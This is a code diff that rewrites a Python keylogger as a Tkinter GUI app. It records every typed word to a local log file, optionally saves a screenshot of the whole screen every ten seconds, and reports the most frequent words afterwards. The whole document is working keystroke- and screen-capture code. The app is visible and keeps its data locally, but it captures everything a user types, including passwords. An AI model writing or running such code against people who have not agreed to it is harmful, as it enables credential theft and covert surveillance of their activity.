@@ -1,100 +1,128 @@
+import tkinter as tk
+from tkinter import scrolledtext, messagebox
 from pynput import keyboard
 from collections import Counter
-import re
+from prettytable import PrettyTable
 from PIL import ImageGrab
 import threading
 import time
 
-# Function to write logged keys to a file
+typed_words = []
+current_word = ""
+listener = None
+logging = False
+screenshot_running = False
+
+# Log writer
 def write(text):
     try:
         with open("keylogger.txt", 'a') as f:
             f.write(text)
-    except IOError as e:
-        print(f"Error writing to file: {e}")
+    except Exception as e:
+        print(f"Write error: {e}")
 
-# Function to handle key press events
+# Key press handler
 def on_key_press(Key):
-    try:
-        if Key == keyboard.Key.enter:
-            write("\n")
-        else:
-            write(Key.char)
-    except AttributeError:
-        if Key == keyboard.Key.backspace:
-            write("\nBackspace Pressed\n")
-        elif Key == keyboard.Key.tab:
-            write("\nTab Pressed\n")
-        elif Key == keyboard.Key.space:
-            write(" ")
-        else:
-            temp = repr(Key) + " Pressed.\n"
-            write(temp)
-            print("\n{} Pressed\n".format(Key))
+    global current_word, typed_words
 
-# Function to handle key release events
+    try:
+        if hasattr(Key, 'char') and Key.char is not None:
+            current_word += Key.char
+        elif Key == keyboard.Key.space or Key == keyboard.Key.enter:
+            if current_word.strip():
+                typed_words.append(current_word.strip())
+                write(current_word.strip() + " ")
+                current_word = ""
+    except Exception as e:
+        print(f"Key press error: {e}")
+
+# Key release handler
 def on_key_release(Key):
-    # Stop the keylogger when the "esc" key is released
     if Key == keyboard.Key.esc:
+        stop_logging()
         return False
 
-# Function to take a screenshot
-def take_screenshot():
-    """
-    Take a screenshot and save it as an image file.
-    """
-    count = 1  # To keep track of screenshot numbers
-    while True:
+# Screenshot thread
+def take_screenshots():
+    count = 1
+    global screenshot_running
+    screenshot_running = True
+    while screenshot_running:
         try:
             screenshot = ImageGrab.grab()
             filename = f"screenshot_{count}.png"
             screenshot.save(filename)
-            print(f"Screenshot saved to '{filename}'")
             count += 1
-            time.sleep(5)  # Wait for 5 seconds before taking the next screenshot
+            time.sleep(10)
         except Exception as e:
-            print(f"Error taking screenshot: {e}")
+            print(f"Screenshot error: {e}")
             break
 
-# Function to analyze the keylogger output
-def analyze_keylogs(file_path):
-    """
-    Analyze the keylogger file to count all words and provide insights.
-    """
+# Start keylogger
+def start_logging():
+    global listener, logging
+    if logging:
+        return
+    logging = True
+    output_text.insert(tk.END, "Keylogger started...\n")
+
+    with open("keylogger.txt", "w"):  # clear previous logs
+        pass
+
+    listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
+    listener.start()
+
+    if screenshot_checkbox_var.get():
+        threading.Thread(target=take_screenshots, daemon=True).start()
+
+# Stop keylogger
+def stop_logging():
+    global logging, screenshot_running
+    if not logging:
+        return
+    logging = False
+    screenshot_running = False
+    output_text.insert(tk.END, "Keylogger stopped.\n")
+    show_analysis()
+
+# Show analysis
+def show_analysis():
     try:
-        with open(file_path, 'r') as f:
+        with open("keylogger.txt", 'r') as f:
             data = f.read()
-        
-        # Use regex to extract words (ignoring special characters and spaces)
-        words = re.findall(r'\b\w+\b', data.lower())
-        
-        # Count total characters logged
-        char_count = len(data)
-        
-        # Count occurrences of each word
-        word_count = Counter(words)
-        
-        print(f"Analysis of '{file_path}':")
-        print(f"Total Characters Logged: {char_count}")
-        print(f"Total Words Logged: {len(words)}")
-        print("\nWord Frequency:")
-        
-        for word, count in word_count.items():
-            print(f"{word}: {count}")
-        
-        return char_count, word_count
-    
     except FileNotFoundError:
-        print(f"Error: The file '{file_path}' does not exist.")
-        return None
+        messagebox.showerror("Error", "Log file not found!")
+        return
 
-# Start the screenshot thread
-screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
-screenshot_thread.start()
+    words = data.split()
+    total_words = len(words)
+    word_count = Counter(words)
 
-# Start the keylogger listener
-with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
-    listener.join()
+    table = PrettyTable()
+    table.field_names = ["Word", "Frequency"]
+    for word, count in word_count.most_common(10):
+        table.add_row([word, count])
 
-# Call the new function to analyze keylogs (optional; can be done after stopping the program)
-analyze_keylogs("keylogger.txt")
+    output_text.insert(tk.END, f"\nTotal Words Typed: {total_words}")
+    output_text.insert(tk.END, f"\nUnique Words Used: {len(word_count)}\n")
+    output_text.insert(tk.END, f"\nTop 10 Words:\n{table}\n")
+
+# GUI setup
+root = tk.Tk()
+root.title("Python Keylogger with GUI")
+root.geometry("700x500")
+
+start_button = tk.Button(root, text="Start Keylogger", command=start_logging, bg="green", fg="white", font=("Arial", 12))
+start_button.pack(pady=10)
+
+stop_button = tk.Button(root, text="Stop Keylogger", command=stop_logging, bg="red", fg="white", font=("Arial", 12))
+stop_button.pack(pady=5)
+
+screenshot_checkbox_var = tk.BooleanVar()
+screenshot_checkbox = tk.Checkbutton(root, text="Enable Screenshots", variable=screenshot_checkbox_var, font=("Arial", 11))
+screenshot_checkbox.pack()
+
+output_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20, font=("Courier", 10))
+output_text.pack(padx=10, pady=10)
+
+root.mainloop()
